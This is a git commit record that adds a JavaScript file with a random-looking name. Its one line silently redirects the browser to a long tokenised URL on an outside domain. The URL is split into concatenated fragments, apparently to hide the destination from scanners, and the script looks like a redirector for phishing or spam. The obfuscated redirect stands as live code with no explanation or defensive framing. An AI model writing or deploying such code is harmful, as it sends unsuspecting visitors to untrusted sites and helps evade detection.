1956ac2e7d69e861e213f06c22cafb74c4968a2b
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-09 13:20:23 +0100

    Create fyhftyjdtyhfrdthtyhsrthdrthdth.js

---
+++ fyhftyjdtyhfrdthtyhsrthdrthdth.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://www.roads`,`work`,`s.com/3cg_76`,`nB0tTPedLx`,`ulXgPqxZgARDF3Ab`,`h7yeUjjK_s`,`OSzBGpxBDTH`,`gx4zWIiW5NJ6`,`GZR-qRwPgD`,`1cgfu4jreuA~~/TAHA/9to68zho4n`))
